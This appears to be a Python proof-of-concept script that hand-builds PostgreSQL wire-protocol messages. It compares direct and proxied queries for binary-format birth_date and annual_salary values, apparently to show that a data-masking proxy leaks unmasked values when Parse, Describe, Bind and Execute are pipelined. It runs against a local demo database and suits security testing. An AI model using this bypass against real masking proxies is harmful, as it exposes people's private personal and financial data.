import socket, struct, sys
def msg(t,b): return t+struct.pack('!i',len(b)+4)+b
def cstr(s): return s.encode()+b'\0'
def rd(s):
    h=b''
    while len(h)<5:
        c=s.recv(5-len(h))
        if not c: return None,None
        h+=c
    t,l=h[0:1],struct.unpack('!i',h[1:5])[0]; b=b''
    while len(b)<l-4:
        c=s.recv(l-4-len(b))
        if not c: break
        b+=c
    return t,b
def conn(port):
    s=socket.create_connection(('127.0.0.1',port),timeout=15)
    st=struct.pack('!i',196608)+cstr('user')+cstr('postgres')+cstr('database')+cstr('demo')+b'\0'
    s.sendall(struct.pack('!i',len(st)+4)+st)
    while True:
        t,_=rd(s)
        if t==b'Z' or t is None: return s
def drain(s):
    out=[]
    while True:
        t,b=rd(s)
        if t is None: break
        if t==b'D':
            n=struct.unpack('!h',b[0:2])[0]; off=2; cols=[]
            for _ in range(n):
                ln=struct.unpack('!i',b[off:off+4])[0]; off+=4
                cols.append(None if ln==-1 else b[off:off+ln]); off+= ln if ln>0 else 0
            out.append(cols)
        elif t==b'E':
            f={}
            for p in b.split(b'\0'):
                if len(p)>1: f[p[0:1]]=p[1:].decode('utf8','replace')
            out.append(('ERR',f.get(b'M','?')))
        elif t==b'Z': break
    return out
def show(rows):
    r=[]
    for c in rows:
        if isinstance(c,tuple): return f"ERROR {c[1][:70]}"
        for x in c:
            if x is None: r.append('NULL')
            elif len(x)==4 and x[0:1] in (b'\x00',b'\xff'): r.append(f"{x.hex()}(int={struct.unpack('!i',x)[0]})")
            else: r.append(f"{x.hex()}({x.decode('utf8','replace')[:20]})")
    return " | ".join(r)
SQL='SELECT birth_date, annual_salary FROM demo.customers WHERE id=1'
def pipelined(port):
    s=conn(port)
    buf  = msg(b'P',cstr('')+cstr(SQL)+struct.pack('!h',0))
    buf += msg(b'D',b'S'+cstr(''))
    buf += msg(b'B',cstr('')+cstr('')+struct.pack('!h',0)+struct.pack('!h',0)+struct.pack('!hh',1,1))
    buf += msg(b'E',cstr('')+struct.pack('!i',0))+msg(b'S',b'')
    s.sendall(buf); r=drain(s); s.close(); return r
def two_trip(port):
    s=conn(port)
    s.sendall(msg(b'P',cstr('')+cstr(SQL)+struct.pack('!h',0))+msg(b'D',b'S'+cstr(''))+msg(b'S',b''))
    drain(s)                                   # wait for the RowDescription first
    s.sendall(msg(b'B',cstr('')+cstr('')+struct.pack('!h',0)+struct.pack('!h',0)+struct.pack('!hh',1,1))
             +msg(b'E',cstr('')+struct.pack('!i',0))+msg(b'S',b''))
    r=drain(s); s.close(); return r
D,P=int(sys.argv[1]),int(sys.argv[2])
print("masked binary = ffffd533(-10957) | 000061a8(25000);  leak = ffffd534(-10956) | 0000aab4(43700)\n")
print("  PIPELINED (Parse+Describe+Bind+Execute in one flush):")
print(f"      direct : {show(pipelined(D))}")
print(f"      proxied: {show(pipelined(P))}")
print("\n  TWO ROUND TRIPS (wait for Describe response, then Bind):")
print(f"      direct : {show(two_trip(D))}")
print(f"      proxied: {show(two_trip(P))}")
